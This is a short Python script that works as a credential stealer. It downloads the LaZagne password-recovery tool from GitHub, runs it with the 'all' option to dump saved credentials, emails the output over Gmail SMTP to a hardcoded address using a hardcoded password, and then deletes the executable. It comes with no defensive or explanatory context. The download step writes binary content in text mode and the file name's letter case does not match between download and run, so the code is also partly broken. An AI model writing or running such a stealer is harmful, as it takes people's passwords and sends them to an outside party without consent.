import subprocess
import subprocess as sp, smtplib, requests , os,tempfile
def send_mail(email, password, message):
    print(message)
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email, email, message)
    server.quit()


def download(url):
    get_request = requests.get(url)
    file_name = url.split("/")[-1]
    imagefile = open(file_name,"w")
    imagefile.write(get_request.content)
    imagefile.close()

# temp_dir = tempfile.gettempdir()
# os.chdir(temp_dir)
download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")
result = subprocess.check_output("laZagne.exe all", shell=True)
send_mail("tcode518@gmail.com","trialonly@1234", result)
os.remove("laZagne.exe")


